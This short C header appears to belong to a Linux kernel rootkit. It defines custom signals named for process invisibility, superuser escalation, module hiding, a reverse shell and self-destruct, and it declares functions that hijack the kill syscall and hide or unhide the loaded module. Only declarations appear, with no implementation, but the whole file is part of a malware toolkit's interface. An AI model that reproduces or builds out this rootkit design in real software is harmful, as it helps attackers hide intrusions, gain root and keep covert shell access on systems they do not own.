#ifndef H_KILL_H
#define H_KILL_H


enum {
    SIGINVIS = 31,
    SIGSUPER = 64,
    SIGMODINVIS = 63,
    SIGREVSHELL = 60,
    SIGDESTRUCT = 30,
};

int new_kill(const struct pt_regs *pt_regs);
void hijack_kill(void);
void restore_kill(void);

struct task_struct *find_task(pid_t pid);

void module_show(void);
void module_hide(void);

int is_module_hidden(void);


#endif /* H_KILL_H */